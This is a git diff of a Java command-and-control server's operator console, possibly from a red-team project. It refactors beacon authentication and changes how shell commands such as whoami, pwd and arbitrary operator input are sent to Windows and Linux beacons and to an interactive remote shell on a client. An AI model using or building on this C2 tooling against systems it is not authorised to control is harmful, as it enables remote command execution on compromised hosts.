@@ -1,7 +1,5 @@
 package Servers.C2;
 
-import java.nio.charset.StandardCharsets;
-import java.security.MessageDigest;
 import java.util.HashMap;
 import java.util.LinkedList;
 import java.util.Scanner;
@@ -22,9 +20,6 @@ public class C2ServerUserHandler implements Runnable{
 
     // Scanner for the user to enter input
     private Scanner userInputScanner;
-
-    // Hashed Password for authentication betwen the Server and the Beacon
-    private String passwordDigest;
 
     // This is a Hash Map of Long Range Beacons that are waiting for MFA.
     // The Key is the IP Address of the Beacon, and the Value is it's status,
@@ -49,7 +44,6 @@ public class C2ServerUserHandler implements Runnable{
     protected C2ServerUserHandler(C2Server server){
         this.C2server = server;
         this.userInputScanner = new Scanner(System.in);
-        this.passwordDigest = null;
         this.beaconsWaitingForMFA = new HashMap<>();
         this.currentUserPath = "";
         this.messageQueue = new LinkedList<String>();
@@ -66,13 +60,8 @@ public class C2ServerUserHandler implements Runnable{
      * @return Either 'Authentication Successful', 'Authentication Failed: Incorrect Password', 'Authentication 
      * Failed: User Denied MFA Prompt', or 'Authentication Failed: Authentication Process could not be completed'
      */
-    protected String authenticateToC2(String enteredPasswordHash, String IPAddress){
-        if(enteredPasswordHash.equals(passwordDigest)){
-            beaconsWaitingForMFA.put(IPAddress, "Waiting");
-        } else{
-            return "Authentication Failed: Incorrect Password";
-        }
-
+    protected String authenticateToC2(String IPAddress){
+        beaconsWaitingForMFA.put(IPAddress, "Waiting");
         try{
             synchronized(beaconsWaitingForMFA){
                 beaconsWaitingForMFA.wait();
@@ -89,7 +78,6 @@ public class C2ServerUserHandler implements Runnable{
             e.printStackTrace();
         }
         return "Authentication Failed: Authentication Process could not be completed";
-        
     }
 
     /**
@@ -232,8 +220,8 @@ public class C2ServerUserHandler implements Runnable{
         // Take commands from user
         if(userInput.equals("1") || userInput.equals("2")){
             System.out.print("Enter Command to be run >> ");
-            String finalCommand = "Command " + scope + "_" + userInputScanner.nextLine();
-            C2server.broadcastToBeacons(finalCommand);
+            String command = userInputScanner.nextLine();
+            C2server.distributeCommandToBeacons(scope, command);
             currentUserPath = "Command " + OS;
         }
         System.out.println(RESET);
@@ -244,12 +232,21 @@ public class C2ServerUserHandler implements Runnable{
      */
     private void enterClientShell(){
         System.out.println("Enter 'q' at any time to exit the shell and return to the main menu\n");
-        System.out.print("Enter IP address of Client >> ");
-        String clientIP = userInputScanner.nextLine().toLowerCase();
+        String clientOS = "none";
+        String clientIP = "";
+        while(clientOS.equals("none")){
+            System.out.print("Enter IP address of Client >> ");
+            clientIP = userInputScanner.nextLine().toLowerCase();
+            clientOS = C2server.getClientOS(clientIP);
+            if(clientIP.equals("q")){
+                break;
+            }
+        }
+        
         if(clientIP.equals("q")){
             currentUserPath = "";
         } else {
-            String clientOS = C2server.getClientOS(clientIP);
+            
             System.out.println("Setting up Shell ... \n");
 
             // Empty the Message Queue
@@ -276,7 +273,7 @@ public class C2ServerUserHandler implements Runnable{
             numMessagesRead = C2server.getClientResponses(clientIP).get(clientIP).size();
 
             // Send pwd so that we can get the current directory
-            C2server.getShellResponse("Command " + clientIP + "_pwd");
+            C2server.getShellResponse(clientIP, "pwd");
 
             // Iterate through all messages we haven't read already, and see if there is a directory in any of them
             messages = C2server.getClientResponses(clientIP).get(clientIP);
@@ -389,7 +386,7 @@ public class C2ServerUserHandler implements Runnable{
 
                         if(runCommand){
                             // Send the Command
-                            C2server.getShellResponse("Command " + clientIP + "_" + command);
+                            C2server.getShellResponse(clientIP, command);
 
                             messages = C2server.getClientResponses(clientIP).get(clientIP);
                             for(int i = numMessagesRead; i < messages.size(); i++){
@@ -421,27 +418,16 @@ public class C2ServerUserHandler implements Runnable{
         String password1 = "";
         String password2 = "a";
         while(!(password1.equals(password2))){
-            password1 = new String(passwordInputConsole.readPassword("Enter Password for authentication: "));
-            password2 = new String(passwordInputConsole.readPassword("Re-enter Password: "));
+            password1 = new String(passwordInputConsole.readPassword("Enter root Password: "));
+            password2 = new String(passwordInputConsole.readPassword("Re-enter root Password: "));
             if(!(password1.equals(password2))){
                 System.out.println("Passwords do not match");
             }
         }
 
-        // This password is then hashed and stored
-        try{
-            MessageDigest digest = MessageDigest.getInstance("SHA-256");
-            byte[] encodedhash = digest.digest(password1.getBytes(StandardCharsets.UTF_8));
-            StringBuilder hexString = new StringBuilder(2 * encodedhash.length);
-            for (int i = 0; i < encodedhash.length; i++) {
-                String hex = Integer.toHexString(0xff & encodedhash[i]);
-                if(hex.length() == 1) {
-                    hexString.append('0');
-                }
-                hexString.append(hex);
-            }
-            passwordDigest = hexString.toString();
-        } catch(Exception e){}
+        // This password is stored as the root password in the C2 Server Password database
+        C2server.updateUsernamePassword("root", C2Server.hashPassword(password1));
+
         
         // Loop for the User to use the CLI
         String userInput = "";
@@ -657,10 +643,10 @@ public class C2ServerUserHandler implements Runnable{
                     // Send commands based on os/scope
                     if(target.equals("all")){
                         if(os.equals("windows") || os.equals("all")){
-                            C2server.broadcastToBeacons("Command Windows_" + windowsCommands);
+                            C2server.distributeCommandToBeacons("Windows", windowsCommands);
                         }
                         if(os.equals("linux") || os.equals("all")){
-                            C2server.broadcastToBeacons("Command Linux_" + linuxCommands);
+                            C2server.distributeCommandToBeacons("Linux", linuxCommands);
                         }
                     } else {
                         // Temporary fix to have the target match the protocl
@@ -670,9 +656,9 @@ public class C2ServerUserHandler implements Runnable{
                             target = "Linux";
                         }
                         if(os.equals("windows")){
-                            C2server.broadcastToBeacons("Command " + target + "_" + windowsCommands);
+                            C2server.distributeCommandToBeacons(target, windowsCommands);
                         } else {
-                            C2server.broadcastToBeacons("Command " + target + "_" + linuxCommands);
+                            C2server.distributeCommandToBeacons(target, linuxCommands);
                         }
                     }
                 }
@@ -736,13 +722,13 @@ public class C2ServerUserHandler implements Runnable{
 
             // Get Client Status Data
             } else if(currentUserPath.equals("Status")){
-                C2server.broadcastToBeacons("Command Windows_whoami");
-                C2server.broadcastToBeacons("Command Linux_whoami");
+                C2server.distributeCommandToBeacons("Windows", "whoami");
+                C2server.distributeCommandToBeacons("Linux", "whoami");
                 
                 try {
                     waitForResponse();
                 } catch (InterruptedException e) {e.printStackTrace();}
-                System.out.println(C2server.getClientStatus());
+                System.out.println(C2server.formatClientStatus(C2server.getClientStatus()));
                 currentUserPath = "";
             }
         }
